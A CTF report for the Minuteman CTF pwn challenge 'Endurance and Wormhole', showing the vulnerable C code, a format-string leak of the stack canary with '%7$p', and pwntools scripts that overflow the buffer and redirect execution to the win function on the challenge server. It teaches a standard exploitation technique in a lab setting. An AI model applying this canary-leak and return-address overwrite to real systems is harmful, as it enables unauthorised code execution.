---
author: atch2203
pubDatetime: 2024-11-01
title: Endurance and Wormhole Writeup
featured: false
draft: false
tags:
  - cybersec
  - writeups
description: writeup for minuteman CTF pwn challenge
---

This is a writeup I did for a medium pwn challenge "Endurance and Wormhole" for Minuteman CTF.

We're given [source](https://storage.googleapis.com/static-challs-assets-88819/pwn/endurance-and-wormhole/static/wormhole.c)!

```c
char buf[8] = {0};
scanf("%5s",buf);
printf(buf);
puts("Cool! Let's go towards the wormhole!");
scanf("%s", buf);
```

It looks like our goal is to ret to the wormhole function, and we're given a printf and arbitrary length scanf. The issue here is that canary is enabled and detects whenever we overwrite the ret address.
![alt text](@assets/images/writeups/wormhole/20241101132349.png)

We can only put 5 characters into printf, so we're gonna have to make our canary leak precise.

## Playing around with the printf

Let's see what happens when we send `%i$p`

1) 0xa
2) nil
3) nil
4) 0x402011
5) inconsistent
6) 0x70243625
7) inconsistent
8) inconsistent, but starts with 0x7fff
9) inconsistent, but ends with 24a (1ca on remote/actual challenge)

There's not really much I can do with this information, but at least we know the printf leak works.

## Looking for the canary

Let's pop the binary into ghidra now. Looking at the second line of main, the stack moves down by 16, which might explain the canary activating after we send ~13 chars.

```asm
00401291 48 83 ec 10     SUB        RSP,0x10
```

Let's try to simply overwrite the canary without being kicked out. As shown above, writing more than 13 bytes will trigger the canary. That means we want to copy what is in `(rsp+8)`, which can be done with `%7$p`.
![alt text](@assets/images/writeups/wormhole/20241101140338.png)

## overflowing without disturbing the canary

Now we want to send that back in the same place so the canary doesn't change:

```python
from pwn import *

p = gdb.debug('./wormhole')

p.clean()
p.sendline(b"%7$p")

output = p.recvuntil(b"Cool")[:-4]
canary = int(output, 16)
print(hex(canary))

payload = b"12345678" + p64(canary) + b"ebpthing"

p.sendline(payload)

p.interactive()
```

Looks like it works! We were able to overwrite the old ebp (right after the canary) without disturbing the canary.
![alt text](@assets/images/writeups/wormhole/20241101140811.png)

## putting it all together

Looking at the disassembly, we want to jump to `004011d2`.
![alt text](@assets/images/writeups/wormhole/20241101140847.png)

With the script we had before, all we just need to do is send the address right after the old ebp.

```python
from pwn import *

p = remote("pwn-challenges.minuteman.umasscybersec.org", 9004)

p.recvline()
p.recvline()
p.sendline(b"%7$p")
output = p.recvuntil(b"Cool")[:-4]
canary = int(output, 16)

payload = b"12345678" + p64(canary) + b"ebpthing" + p64(0x004011d2)

p.sendline(payload)

p.interactive()
```

and it works!

![alt text](@assets/images/writeups/wormhole/20241101141142.png)
